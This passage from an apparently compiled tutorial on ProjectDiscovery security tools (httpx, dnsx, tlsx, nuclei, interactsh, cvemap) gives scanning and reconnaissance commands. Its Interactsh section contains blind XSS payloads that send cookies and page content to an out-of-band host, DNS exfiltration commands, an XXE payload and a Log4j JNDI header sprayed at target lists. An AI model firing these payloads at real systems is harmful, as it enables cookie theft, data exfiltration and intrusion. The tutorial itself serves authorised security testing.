.url\'\n\n# Check for information disclosure\ncat domains.txt | httpx -server -tech-detect | grep -E "(nginx|apache|iis).*[0-9]"\n'})}),"\n",(0,i.jsx)(n.h4,{id:"advanced-techniques-3",children:"Advanced Techniques"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Custom HTTP Methods"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Test different HTTP methods\nfor method in GET POST PUT DELETE PATCH OPTIONS; do\n    echo "https://target.com/api/users" | httpx -method $method -silent\ndone\n\n# Method enumeration\ncat endpoints.txt | httpx -method OPTIONS -response-headers | grep -i allow\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Response Analysis"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Content-based filtering\nhttpx -list urls.txt -match-string "admin"\nhttpx -list urls.txt -filter-string "404"\n\n# Response size analysis\nhttpx -list urls.txt -content-length | awk \'$2 > 10000\'\n\n# Custom header injection\nhttpx -list urls.txt -header "X-Forwarded-For: 127.0.0.1"\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Pipeline Integration"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Complete reconnaissance pipeline\nsubfinder -d target.com -silent | \\\nhttpx -silent -tech-detect -title -status-code | \\\ntee web_assets.txt | \\\nnuclei -t exposures/ -silent\n"})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"11-dnsx---dns-toolkit",children:"11. DNSx - DNS Toolkit"}),"\n",(0,i.jsx)(n.h4,{id:"overview-10",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"DNSx is a fast DNS toolkit for multiple DNS operations including resolution, wildcard testing, and DNS record enumeration."}),"\n",(0,i.jsx)(n.h4,{id:"installation-10",children:"Installation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest\n"})}),"\n",(0,i.jsx)(n.h4,{id:"basic-usage-10",children:"Basic Usage"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Resolve domains\necho "example.com" | dnsx\n\n# Multiple domains\ncat domains.txt | dnsx\n\n# Specific record types\necho "example.com" | dnsx -a -aaaa -cname -mx\n\n# Wildcard testing\necho "example.com" | dnsx -wildcard\n'})}),"\n",(0,i.jsx)(n.h4,{id:"advanced-features-1",children:"Advanced Features"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"DNS Record Enumeration"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# All record types\necho "example.com" | dnsx -a -aaaa -cname -mx -ns -txt -srv\n\n# Reverse DNS lookup\necho "8.8.8.8" | dnsx -ptr\n\n# DNS over HTTPs\necho "example.com" | dnsx -doh\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Mass Operations"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Resolve large lists\ncat million_domains.txt | dnsx -threads 100\n\n# Response filtering\ncat domains.txt | dnsx -resp-only\n\n# JSON output\ncat domains.txt | dnsx -json\n"})}),"\n",(0,i.jsx)(n.h4,{id:"real-world-scenarios-10",children:"Real-World Scenarios"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 1: DNS Infrastructure Analysis"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: Enterprise network\n# Objective: Map DNS infrastructure and identify misconfigurations\n\n# Step 1: Enumerate all DNS records\ncat enterprise_domains.txt | dnsx -a -aaaa -cname -mx -ns -txt -json > dns_records.json\n\n# Step 2: Identify DNS servers\njq -r '.[] | select(.ns != null) | .ns[]?' dns_records.json | sort -u > dns_servers.txt\n\n# Step 3: Check for DNS misconfigurations\n# Zone transfer attempts\ncat dns_servers.txt | while read ns; do\n    dig @$ns enterprise.com axfr\ndone\n\n# SPF record analysis\njq -r '.[] | select(.txt != null) | .txt[]? | select(. | contains(\"spf\"))' dns_records.json\n\n# Step 4: Identify subdomain takeover opportunities\njq -r '.[] | select(.cname != null) | [.host, .cname] | @csv' dns_records.json > cname_targets.csv\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 2: Cloud Migration Assessment"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: Company migrating to cloud\n# Objective: Track DNS changes and identify legacy infrastructure\n\n# Pre-migration snapshot\ncat company_domains.txt | dnsx -a -aaaa -json > pre_migration_dns.json\n\n# Post-migration comparison\ncat company_domains.txt | dnsx -a -aaaa -json > post_migration_dns.json\n\n# Identify changes\njq -r '.[] | [.host, .a[]] | @csv' pre_migration_dns.json | sort > pre_ips.txt\njq -r '.[] | [.host, .a[]] | @csv' post_migration_dns.json | sort > post_ips.txt\ncomm -13 post_ips.txt pre_ips.txt > legacy_ips.txt\n\n# Analyze cloud provider distribution\njq -r '.[] | .a[]?' post_migration_dns.json | while read ip; do\n    whois $ip | grep -E \"(AWS|Amazon|Microsoft|Google|Azure)\"\ndone | sort | uniq -c\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 3: Threat Intelligence and Monitoring"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Critical infrastructure\n# Objective: Monitor for suspicious DNS changes\n\n# Daily DNS monitoring\nDATE=$(date +%Y%m%d)\ncat critical_domains.txt | dnsx -a -json > "dns_snapshot_$DATE.json"\n\n# Compare with previous day\nif [ -f "dns_snapshot_$(date -d yesterday +%Y%m%d).json" ]; then\n    # Extract A records\n    jq -r \'.[] | [.host, .a[]] | @csv\' "dns_snapshot_$DATE.json" | sort > today_dns.txt\n    jq -r \'.[] | [.host, .a[]] | @csv\' "dns_snapshot_$(date -d yesterday +%Y%m%d).json" | sort > yesterday_dns.txt\n    \n    # Find changes\n    echo "New DNS records:"\n    comm -13 yesterday_dns.txt today_dns.txt\n    \n    echo "Removed DNS records:"\n    comm -23 yesterday_dns.txt today_dns.txt\nfi\n\n# Check for suspicious TXT records\ncat critical_domains.txt | dnsx -txt | grep -E "(bitcoin|crypto|ransom)"\n'})}),"\n",(0,i.jsx)(n.h4,{id:"advanced-techniques-4",children:"Advanced Techniques"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Wildcard Detection and Handling"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Test for wildcard DNS\necho "example.com" | dnsx -wildcard\n\n# Generate random subdomains to test wildcards\nfor i in {1..10}; do\n    echo "$(openssl rand -hex 8).example.com"\ndone | dnsx -wildcard\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Custom Resolver Configuration"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Use specific resolvers\necho "example.com" | dnsx -resolver 8.8.8.8,1.1.1.1\n\n# Test resolver performance\nfor resolver in 8.8.8.8 1.1.1.1 9.9.9.9; do\n    time echo "example.com" | dnsx -resolver $resolver\ndone\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Integration with Other Tools"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# DNSx + Naabu for comprehensive enumeration\ncat domains.txt | dnsx -a -resp-only | naabu -top-ports 1000\n\n# DNSx + Httpx pipeline\ncat domains.txt | dnsx -a -resp-only | httpx -silent\n"})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"12-tlsx---tlsssl-analysis-tool",children:"12. TLSx - TLS/SSL Analysis Tool"}),"\n",(0,i.jsx)(n.h4,{id:"overview-11",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"TLSx specializes in TLS/SSL data collection, providing insights into certificates, cipher suites, and SSL/TLS configurations."}),"\n",(0,i.jsx)(n.h4,{id:"installation-11",children:"Installation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"go install -v github.com/projectdiscovery/tlsx/cmd/tlsx@latest\n"})}),"\n",(0,i.jsx)(n.h4,{id:"basic-usage-11",children:"Basic Usage"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Basic TLS probe\necho "https://example.com" | tlsx\n\n# Certificate information\necho "https://example.com" | tlsx -cert\n\n# Cipher suite enumeration\necho "https://example.com" | tlsx -cipher\n\n# JSON output\necho "https://example.com" | tlsx -json\n'})}),"\n",(0,i.jsx)(n.h4,{id:"advanced-features-2",children:"Advanced Features"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Certificate Analysis"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Certificate details\necho "https://example.com" | tlsx -cert -cert-info\n\n# Certificate chain\necho "https://example.com" | tlsx -cert -chain\n\n# Certificate expiry\necho "https://example.com" | tlsx -cert -expiry\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Security Assessment"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Vulnerability scanning\necho "https://example.com" | tlsx -vulns\n\n# Protocol version testing\necho "https://example.com" | tlsx -tls-version\n\n# JARM fingerprinting\necho "https://example.com" | tlsx -jarm\n'})}),"\n",(0,i.jsx)(n.h4,{id:"real-world-scenarios-11",children:"Real-World Scenarios"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 1: Enterprise Certificate Management"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: Large corporation\n# Objective: Audit SSL/TLS certificates across infrastructure\n\n# Step 1: Discover HTTPS services\ncat corporate_domains.txt | httpx -silent -https | tee https_services.txt\n\n# Step 2: Certificate inventory\ncat https_services.txt | tlsx -cert -cert-info -json > certificate_inventory.json\n\n# Step 3: Identify expiring certificates\njq -r '.[] | select(.cert_expiry != null) | [.host, .cert_expiry] | @csv' certificate_inventory.json | \\\nwhile IFS=, read host expiry; do\n    expiry_date=$(date -d \"$expiry\" +%s)\n    current_date=$(date +%s)\n    days_until_expiry=$(( (expiry_date - current_date) / 86400 ))\n    \n    if [ $days_until_expiry -lt 30 ]; then\n        echo \"$host expires in $days_until_expiry days ($expiry)\"\n    fi\ndone\n\n# Step 4: Certificate authority analysis\njq -r '.[] | .cert_issuer' certificate_inventory.json | sort | uniq -c | sort -nr\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 2: Security Configuration Assessment"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: Financial services company\n# Objective: Assess TLS security across all services\n\n# TLS version compliance check\ncat financial_services.txt | tlsx -tls-version -json | \\\njq -r '.[] | select(.tls_version != null) | [.host, .tls_version] | @csv' | \\\ngrep -v \"1.2\\|1.3\" > weak_tls_versions.csv\n\n# Cipher suite security analysis\ncat financial_services.txt | tlsx -cipher -json > cipher_analysis.json\njq -r '.[] | select(.cipher != null) | [.host, .cipher] | @csv' cipher_analysis.json | \\\ngrep -E \"(RC4|DES|MD5|SHA1)\" > weak_ciphers.csv\n\n# Certificate validation issues\ncat financial_services.txt | tlsx -cert -json | \\\njq -r '.[] | select(.cert_error != null) | [.host, .cert_error] | @csv'\n\n# HSTS implementation check\ncat financial_services.txt | httpx -response-headers -json | \\\njq -r '.[] | select(.headers[\"strict-transport-security\"] == null) | .url' > missing_hsts.txt\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 3: Threat Hunting and Attribution"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: Suspicious infrastructure\n# Objective: Use TLS fingerprinting for threat attribution\n\n# JARM fingerprinting for infrastructure correlation\ncat suspicious_ips.txt | tlsx -jarm -json > jarm_fingerprints.json\n\n# Group by JARM fingerprint\njq -r '.[] | [.jarm, .host] | @csv' jarm_fingerprints.json | \\\nsort | awk -F, '{print $1}' | uniq -c | sort -nr\n\n# Certificate analysis for infrastructure links\ncat suspicious_ips.txt | tlsx -cert -cert-info -json | \\\njq -r '.[] | [.host, .cert_issuer, .cert_subject] | @csv' > certificate_attribution.csv\n\n# Identify shared certificates\ncut -d, -f2,3 certificate_attribution.csv | sort | uniq -c | sort -nr | head -20\n"})}),"\n",(0,i.jsx)(n.h4,{id:"advanced-techniques-5",children:"Advanced Techniques"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Custom Certificate Validation"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Check for specific certificate authorities\ncat domains.txt | tlsx -cert -json | \\\njq -r '.[] | select(.cert_issuer | contains(\"Let'\\''s Encrypt\")) | .host'\n\n# Wildcard certificate detection\ncat domains.txt | tlsx -cert -json | \\\njq -r '.[] | select(.cert_subject | contains(\"*\")) | [.host, .cert_subject] | @csv'\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Performance and Monitoring"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# TLS handshake timing\ncat critical_services.txt | tlsx -json | \\\njq -r '.[] | [.host, .tls_handshake_time] | @csv'\n\n# Continuous monitoring script\n#!/bin/bash\nwhile true; do\n    DATE=$(date +%Y%m%d_%H%M%S)\n    cat critical_services.txt | tlsx -cert -expiry -json > \"tls_monitor_$DATE.json\"\n    sleep 3600\ndone\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Integration with Security Tools"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# TLSx + Nuclei for TLS vulnerability scanning\ncat https_services.txt | tlsx -json | \\\njq -r '.host' | nuclei -t ssl/\n\n# TLSx + Custom analysis\ncat domains.txt | tlsx -cert -json | \\\njq -r '.[] | select(.cert_expired == true) | .host' | \\\nhttpx -title -status-code\n"})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"detection-tools",children:"Detection Tools"}),"\n",(0,i.jsx)(n.h3,{id:"13-nuclei---vulnerability-scanner",children:"13. Nuclei - Vulnerability Scanner"}),"\n",(0,i.jsx)(n.h4,{id:"overview-12",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"Nuclei is a fast vulnerability scanner based on YAML templates, capable of scanning for thousands of different security issues."}),"\n",(0,i.jsx)(n.h4,{id:"installation-12",children:"Installation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest\n\n# Update templates\nnuclei -update-templates\n"})}),"\n",(0,i.jsx)(n.h4,{id:"basic-usage-12",children:"Basic Usage"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Basic scan\nnuclei -u https://example.com\n\n# Scan with specific templates\nnuclei -u https://example.com -t cves/\n\n# Scan from file\nnuclei -list urls.txt\n\n# Severity filtering\nnuclei -u https://example.com -severity high,critical\n"})}),"\n",(0,i.jsx)(n.h4,{id:"template-categories",children:"Template Categories"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# CVE scanning\nnuclei -u https://example.com -t cves/\n\n# Technology detection\nnuclei -u https://example.com -t technologies/\n\n# Misconfiguration detection\nnuclei -u https://example.com -t misconfiguration/\n\n# Exposed panels\nnuclei -u https://example.com -t exposed-panels/\n\n# Default credentials\nnuclei -u https://example.com -t default-logins/\n"})}),"\n",(0,i.jsx)(n.h4,{id:"real-world-scenarios-12",children:"Real-World Scenarios"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 1: Comprehensive Security Assessment"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: E-commerce platform\n# Objective: Complete vulnerability assessment\n\n# Step 1: Discovery and enumeration\nsubfinder -d ecommerce.com -silent | httpx -silent > ecommerce_targets.txt\n\n# Step 2: Technology identification\nnuclei -list ecommerce_targets.txt -t technologies/ -json > tech_stack.json\n\n# Step 3: CVE scanning based on identified technologies\njq -r '.[\"template-id\"]' tech_stack.json | sort -u > detected_techs.txt\nnuclei -list ecommerce_targets.txt -t cves/ -tags \"$(tr '\\n' ',' < detected_techs.txt)\" -json > cve_results.json\n\n# Step 4: Configuration and exposure checks\nnuclei -list ecommerce_targets.txt -t exposures/ -t misconfiguration/ -severity medium,high,critical -json > config_issues.json\n\n# Step 5: Generate comprehensive report\njq -r '[.host, .[\"template-id\"], .info.severity, .info.name] | @csv' cve_results.json config_issues.json > vulnerability_report.csv\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 2: Continuous Security Monitoring"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Critical infrastructure\n# Objective: 24/7 vulnerability monitoring\n\n#!/bin/bash\n# Script: continuous_nuclei_monitor.sh\n\nTARGETS_FILE="critical_assets.txt"\nALERT_WEBHOOK="https://hooks.slack.com/services/YOUR/WEBHOOK/URL"\n\nwhile true; do\n    TIMESTAMP=$(date +%Y%m%d_%H%M%S)\n    \n    # Scan for high/critical vulnerabilities\n    nuclei -list $TARGETS_FILE -severity high,critical -json -o "scan_$TIMESTAMP.json"\n    \n    # Check for new vulnerabilities\n    if [ -s "scan_$TIMESTAMP.json" ]; then\n        # Send alert\n        jq -r \'.info.name + " - " + .host\' "scan_$TIMESTAMP.json" | \\\n        while read vuln; do\n            curl -X POST -H \'Content-type: application/json\' \\\n                 --data \'{"text":"\ud83d\udea8 Critical Vulnerability Found: \'$vuln\'"}\' \\\n                 $ALERT_WEBHOOK\n        done\n    fi\n    \n    sleep 3600  # Wait 1 hour\ndone\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 3: Supply Chain Security Assessment"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Software vendor and dependencies\n# Objective: Assess third-party security risks\n\n# Vendor\'s main infrastructure\nnuclei -u https://vendor.com -t cves/ -t exposures/ -json > vendor_main.json\n\n# Customer-facing applications\ncat vendor_customer_portals.txt | nuclei -t default-logins/ -t exposures/ -json > customer_portals.json\n\n# API security assessment\ncat vendor_apis.txt | nuclei -t exposures/apis/ -t misconfiguration/ -json > api_security.json\n\n# Development infrastructure\necho -e "dev\\ntest\\nstaging\\nbeta" | while read env; do\n    echo "https://$env.vendor.com"\ndone | nuclei -t exposures/ -t misconfiguration/ -json > dev_infrastructure.json\n\n# Consolidate findings\njq -s \'add\' vendor_main.json customer_portals.json api_security.json dev_infrastructure.json > complete_vendor_assessment.json\n'})}),"\n",(0,i.jsx)(n.h4,{id:"advanced-template-usage",children:"Advanced Template Usage"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Custom Template Creation"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-yaml",children:'# custom-login-check.yaml\nid: custom-login-check\n\ninfo:\n  name: Custom Login Panel Detection\n  author: security-team\n  severity: info\n  tags: panel,login\n\nrequests:\n  - method: GET\n    path:\n      - "{{BaseURL}}/admin"\n      - "{{BaseURL}}/login"\n      - "{{BaseURL}}/administrator"\n    \n    matchers-condition: and\n    matchers:\n      - type: word\n        words:\n          - "login"\n          - "password"\n          - "username"\n        condition: or\n      \n      - type: status\n        status:\n          - 200\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Template Filtering and Optimization"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Run only specific template types\nnuclei -u https://target.com -type http -severity critical\n\n# Exclude certain templates\nnuclei -u https://target.com -exclude-templates cves/2018/\n\n# Custom template directory\nnuclei -u https://target.com -t /custom/templates/\n\n# Rate limiting for stealth\nnuclei -u https://target.com -rate-limit 10 -bulk-size 5\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Advanced Output and Reporting"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Multiple output formats\nnuclei -list targets.txt -json -o results.json -markdown -o report.md\n\n# Custom field extraction\nnuclei -list targets.txt -json | jq -r '.[] | [.host, .[\"template-id\"], .info.severity, .matched-at] | @csv'\n\n# Integration with external tools\nnuclei -list targets.txt -json | jq -r '.host' | sort -u | httpx -title -tech-detect\n"})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"14-interactsh---out-of-band-interaction-server",children:"14. Interactsh - Out-of-Band Interaction Server"}),"\n",(0,i.jsx)(n.h4,{id:"overview-13",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"Interactsh is an out-of-band (OOB) interaction gathering server for detecting vulnerabilities that require external interaction."}),"\n",(0,i.jsx)(n.h4,{id:"installation-13",children:"Installation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest\ngo install -v github.com/projectdiscovery/interactsh/cmd/interactsh-server@latest\n"})}),"\n",(0,i.jsx)(n.h4,{id:"basic-usage-13",children:"Basic Usage"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Start interaction server\ninteractsh-client\n\n# Custom server\ninteractsh-client -server https://custom.interactsh.com\n\n# Poll for interactions\ninteractsh-client -poll -server https://oast.pro\n"})}),"\n",(0,i.jsx)(n.h4,{id:"self-hosted-server-setup",children:"Self-Hosted Server Setup"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Install server\ninteractsh-server -domain interactsh.example.com\n\n# With authentication\ninteractsh-server -domain interactsh.example.com -token secret_token\n\n# HTTPS configuration\ninteractsh-server -domain interactsh.example.com -cert cert.pem -key key.pem\n"})}),"\n",(0,i.jsx)(n.h4,{id:"real-world-scenarios-13",children:"Real-World Scenarios"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 1: SSRF Detection in Web Applications"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Web application with user input\n# Objective: Detect Server-Side Request Forgery\n\n# Start interaction client\ninteractsh-client -json -o ssrf_interactions.json &\nINTERACTSH_PID=$!\n\n# Get the generated subdomain\nINTERACTSH_URL=$(curl -s https://oast.pro/register | jq -r \'.domain\')\n\n# Test SSRF in various parameters\ncurl -X POST "https://webapp.com/profile" \\\n     -d "website=http://$INTERACTSH_URL" \\\n     -d "avatar_url=http://$INTERACTSH_URL/avatar.jpg"\n\ncurl -X POST "https://webapp.com/import" \\\n     -d "url=http://$INTERACTSH_URL/data.xml"\n\n# Wait for interactions\nsleep 60\n\n# Check for received interactions\ncurl -s "https://oast.pro/interactions" | jq -r \'.[] | [.remote_address, .raw_request] | @csv\'\n\nkill $INTERACTSH_PID\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 2: Blind XSS Detection"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Contact forms and user input fields\n# Objective: Detect blind XSS vulnerabilities\n\n# Generate XSS payloads with interaction URLs\nINTERACTSH_URL=$(interactsh-client -domain oast.pro | head -1)\n\n# XSS payloads\ncat > xss_payloads.txt << EOF\n<script>fetch(\'http://$INTERACTSH_URL/xss?cookie=\'+document.cookie)<\/script>\n<img src="x" onerror="fetch(\'http://$INTERACTSH_URL/xss?location=\'+window.location)">\n<svg onload="fetch(\'http://$INTERACTSH_URL/xss?dom=\'+document.documentElement.outerHTML.substring(0,1000))">\nEOF\n\n# Submit payloads to contact forms\nwhile read payload; do\n    curl -X POST "https://company.com/contact" \\\n         -d "name=Test" \\\n         -d "email=test@test.com" \\\n         -d "message=$payload"\n    sleep 5\ndone < xss_payloads.txt\n\n# Monitor for interactions\ninteractsh-client -poll -json | jq -r \'.[] | select(.protocol == "http") | .raw_request\'\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 3: DNS Exfiltration and Detection"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Corporate network\n# Objective: Test data exfiltration capabilities\n\n# Start DNS interaction monitoring\ninteractsh-client -json -poll &\n\n# Simulate data exfiltration\nEXFIL_DOMAIN=$(interactsh-client -domain oast.pro | head -1)\n\n# Test DNS exfiltration methods\necho "sensitive-data-12345" | xxd -p | tr -d \'\\n\' | \\\nwhile read hex; do\n    nslookup "$hex.$EXFIL_DOMAIN"\ndone\n\n# Base64 encoded exfiltration\necho "admin:password123" | base64 | tr -d \'\\n\' | \\\nwhile read b64; do\n    nslookup "$b64.$EXFIL_DOMAIN"\ndone\n\n# Monitor received DNS queries\ncurl -s "https://oast.pro/interactions" | \\\njq -r \'.[] | select(.protocol == "dns") | .raw_request\' | \\\ngrep -oP \'(?<=\\s)[a-f0-9]+(?=\\.)\'\n'})}),"\n",(0,i.jsx)(n.h4,{id:"advanced-integration-2",children:"Advanced Integration"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Nuclei Integration"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Use Interactsh with Nuclei for OOB testing\nnuclei -u https://target.com -interactsh-url https://oast.pro -t oob/\n\n# Custom OOB templates\ncat > oob-ssrf.yaml << EOF\nid: oob-ssrf-test\ninfo:\n  name: Out-of-band SSRF Test\n  severity: high\n  \nvariables:\n  oob_domain: "{{interactsh-url}}"\n\nrequests:\n  - method: POST\n    path:\n      - "{{BaseURL}}/webhook"\n    body: \'url=http://{{oob_domain}}\'\n    \n    matchers:\n      - type: word\n        part: interactsh_protocol\n        words:\n          - "http"\nEOF\n\nnuclei -u https://target.com -t oob-ssrf.yaml -interactsh-url https://oast.pro\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Custom Payloads and Automation"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'#!/bin/bash\n# Script: automated_oob_testing.sh\n\nTARGET_LIST="targets.txt"\nINTERACTSH_SERVER="https://oast.pro"\n\n# Start interaction monitoring\ninteractsh-client -server $INTERACTSH_SERVER -json -o interactions.json &\nMONITOR_PID=$!\n\n# Generate unique interaction domain\nINTERACTION_DOMAIN=$(curl -s "$INTERACTSH_SERVER/register" | jq -r \'.domain\')\n\n# Test various OOB vectors\nwhile read target; do\n    echo "Testing $target"\n    \n    # SSRF tests\n    curl -s "$target/api/fetch" -d "url=http://$INTERACTION_DOMAIN/ssrf" 2>/dev/null\n    \n    # XML External Entity\n    curl -s "$target/api/xml" -H "Content-Type: application/xml" \\\n         -d "<?xml version=\'1.0\'?><!DOCTYPE root [<!ENTITY xxe SYSTEM \'http://$INTERACTION_DOMAIN/xxe\'>]><root>&xxe;</root>" 2>/dev/null\n    \n    # Log4j style payloads\n    curl -s "$target/" -H "User-Agent: \\${jndi:ldap://$INTERACTION_DOMAIN/log4j}" 2>/dev/null\n    \n    sleep 2\ndone < $TARGET_LIST\n\n# Wait for interactions\nsleep 30\n\n# Analyze results\njq -r \'.[] | [.timestamp, .protocol, .remote_address, .unique_id] | @csv\' interactions.json\n\nkill $MONITOR_PID\n'})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"15-cvemap---cve-intelligence-tool",children:"15. CVEMap - CVE Intelligence Tool"}),"\n",(0,i.jsx)(n.h4,{id:"overview-14",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"CVEMap provides a structured interface to navigate Common Vulnerabilities and Exposures (CVE) data with advanced filtering and analysis capabilities."}),"\n",(0,i.jsx)(n.h4,{id:"installation-14",children:"Installation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"go install -v github.com/projectdiscovery/cvemap/cmd/cvemap@latest\n"})}),"\n",(0,i.jsx)(n.h4,{id:"basic-usage-14",children:"Basic Usage"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# List recent CVEs\ncvemap -limit 10\n\n# Search by vendor\ncvemap -vendor microsoft\n\n# Search by product\ncvemap -product windows\n\n# Filter by severity\ncvemap -severity critical\n"})}),"\n",(0,i.jsx)(n.h4,{id:"advanced-filtering",children:"Advanced Filtering"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# CVSS score filtering\ncvemap -cvss-score ">8.0"\n\n# EPSS score filtering\ncvemap -epss-score ">0.5"\n\n# Age-based 